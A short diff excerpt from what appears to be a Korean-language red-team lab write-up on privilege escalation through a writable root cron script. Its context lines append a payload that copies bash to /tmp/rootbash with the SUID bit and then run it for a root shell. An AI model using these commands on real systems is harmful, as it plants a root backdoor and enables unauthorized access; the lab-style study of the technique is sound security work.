@@ -70,13 +70,13 @@ echo "* * * * * root /usr/local/bin/backup.sh" >> /etc/crontab
 2. 악성 스크립트 삽입 및 권한 획득 (Red Team)
 공격자는 스크립트에 쓰기 권한이 있는 것을 확인하고, root 권한의 쉘 복사본을 생성해 SUID를 부여하는 악성 페이로드를 주입합니다.
 
-Bash
+
 # 악성 페이로드 주입 및 확인
 echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /usr/local/bin/backup.sh
 cat /usr/local/bin/backup.sh
 <img width="624" height="161" alt="image" src="https://github.com/user-attachments/assets/2d85e0b4-efb2-460c-a1a4-e425ba8baffe" />
 
-Bash
+
 # 1분 대기 후 생성된 백도어 쉘 실행
 ls -l /tmp/rootbash
 /tmp/rootbash -p
